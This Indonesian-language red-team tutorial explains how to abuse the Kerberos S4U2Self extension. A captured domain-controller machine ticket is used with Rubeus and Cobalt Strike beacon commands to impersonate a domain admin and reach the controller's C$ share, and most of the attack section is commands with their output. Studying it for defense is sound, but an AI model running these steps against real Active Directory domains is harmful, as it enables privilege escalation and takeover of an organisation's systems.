---
title: '[Kerberos] S4U2Self Abuse'
date: 2023-08-01 23:28:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

Pada Kerberos terdapat dua ekstensi **Service for User (S4U)**, yaitu **S4U2Self** dan **S4U2Proxy**.

- **S4U2Self** memungkinkan *service* untuk mendapatkan TGS untuk dirinya sendiri atas nama pengguna.
- **S4U2Proxy** memungkinkan *service* untuk mendapatkan TGS atas nama pengguna untuk *service* kedua.

Dalam contoh [Constrained Delegation](/posts/kerberos-constrained-delegation/) sebelumnya, kita menjalankan perintah Rubeus berikut:

```powershell
s4u /impersonateuser:namina /msdsspn:cifs/dc-2.dev.example.io /user:sql-2$
```

Dari *ouput* yang ditampilkan, kita melihat Rubeus pertama-tama membuat permintaan S4U2Self dan mendapatkan TGS untuk `namina` ke `sql-2/dev.example.io`.  Kemudian membuat permintaan S4U2Proxy untuk mendapatkan TGS untuk namina ke `cifs/dc-2.dev.example.io`.

Hal ini jelas bekerja sesuai desain karena `SQL-2` secara khusus dipercaya untuk pendelegasian ke *service* tersebut.  

Namun, ada cara lain yang sangat berguna, yang dipublikasikan oleh [Elad Shamir](https://twitter.com/elad_shamir), untuk menyalahgunakan ekstensi S4U2Self untuk mendapatkan akses ke komputer jika kita memiliki TGT-nya.

Pada materi [Unconstrained Delegation](/posts/kerberos-unconstrained-delegation/), kita memperoleh TGT untuk Domain Controller (komputer).  Jika kita mencoba meneruskan tiket tersebut ke dalam *session logon* dan menggunakannya untuk mengakses direktori `C$` (seperti yang kita lakukan dengan TGT pengguna), itu akan gagal.

```powershell
# Membuat session logon dengan tiket komputer (bukan pengguna)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP

[*] Using DEV\DC-2$:FakePass

[*] Showing process : False
[*] Username        : DC-2$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2832
[+] Ticket successfully imported!
[+] LUID            : 0x4d977f

beacon> steal_token 2832

# Tidak berhasil mengakses direktori target
beacon> ls \\dc-2.dev.example.io\c$
[-] could not open \\dc-2.dev.example.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

Ini karena mesin tidak mendapatkan akses *remote* admin lokal untuk dirinya sendiri.

Yang dapat kita lakukan adalah menyalahgunakan S4U2Self untuk mendapatkan TGS yang dapat digunakan sebagai pengguna yang kita ketahui sebagai admin lokal (mis. Domain Admin). 

Rubeus memiliki *flag* `/self` untuk tujuan ini.

## 0x1 - Exploitation Stages

### Step 1: S4U2Self Abuse

```powershell
PS > .\Rubeus.exe s4u /impersonateuser:namina /self /altservice:cifs/dc-2.dev.example.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'DC-2$@DEV.EXAMPLE.IO'
[*] Using domain controller: dc-2.dev.example.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dc-2.dev.EXAMPLE.io'
[*] Got a TGS for 'namina' to 'cifs@DEV.EXAMPLE.IO'
[*] base64(ticket.kirbi):

doIFyD[...]MuaW8=

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIFyD[...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : namina
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2664
[+] Ticket successfully imported!
[+] LUID            : 0x4ff935

beacon> steal_token 2664

beacon> ls \\dc-2.dev.example.io\c$
```

---

## 0x2 - References

- https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse
- https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/